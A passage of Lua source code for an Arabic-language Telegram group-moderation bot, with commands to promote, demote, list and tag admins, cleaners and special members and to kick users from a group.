if text and text:match("^نزل مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^نزل مطور ثانوي (%d+)$")
database:srem(bot_id.."Dev:mode:2", userid)
Reply_Status(msg,userid,"reply","*⊀︰ تم نزله من المطور ثانويين*")  
return false 
end
if text == ("الثانويين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:mode:2")
t = "\n⊀︰ قائمة مطورين الثانويين للبوت \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "*⊀︰ لا يوجد مطورين ثانويين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانويين") and SudoBot(msg) then
database:del(bot_id.."Dev:mode:2")
send(msg.chat_id_, msg.id_, "\n*⊀︰ تم مسح قائمة المطورين الثانويين *")
end
------------------------------------------------------------------------
if text ==("ارفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"* ⊀︰ لا يوجد ادمنيه ليتم ارفعهم*") 
else
send(msg.chat_id_, msg.id_," ⊀︰ تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '* ⊀︰ تم مسح الادمنيه*')
end
if text == ("الادمنيه") and Manager(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الادمنيه \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد ادمنيه*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد ادمنيه*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("ارفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^ارفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ ادمن*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^ارفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^ارفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("نزل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الادمنيه*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^نزل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الادمنيه*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^نزل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^نزل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من الادمنيه*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من الادمنيه*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and BasicConstructor(msg) then
database:del(bot_id..'MODE7:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '* ⊀︰ تم مسح المنظفين*')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'MODE7:MN:TF'..msg.chat_id_)
t = "\n ⊀︰ قائمة المنظفين \n≪━━━━━━𝙆𝙮━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد المنظفين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
local list = database:smembers(bot_id..'MODE7:MN:TF'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n≪━━━━━━𝙆𝙮━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد منظفين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("ارفع منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
database:sadd(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منظف*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^ارفع منظف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منظف*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^ارفع منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^ارفع منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
database:sadd(bot_id..'MODE7:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ منظف*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ منظف*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("نزل منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المظفين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^نزل منظف @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المظفين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^نزل منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^نزل منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'MODE7:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المظفين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المظفين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ تم تعطيل الطرد*') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
statusk  = '\n *⊀︰ زحلكُتهہ يࢪوحـي..🔫.*'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ تم تعطيل الطرد*') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
statusk  = '\n *⊀︰ زحلكُتهہ يࢪوحـي..🔫.*'
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '*⊀︰ لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *⊀︰ معطليـن الطࢪد يࢪوحتي..') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ماتڪدࢪ تطࢪدني يࢪوحي")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ⊀︰ عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'*⊀︰ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها*') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
 statusk  = '\n *⊀︰ زحلكُتهہ يࢪوحـي..🔫.*'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
 statusk  = '\n *⊀︰ تـم طرد ﭑݪعضوٍَ*'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == 'مسح المميزين' and Mod(msg) then
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '* ⊀︰ تم مسح المميزين*')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة مميزين الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مميزين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمميزين") or text == ("صيح المميزين") then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد مميزين*"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("ارفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ القميـل >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n *⊀︰ تمَ رفعَهہ↫ مميز*'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^ارفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
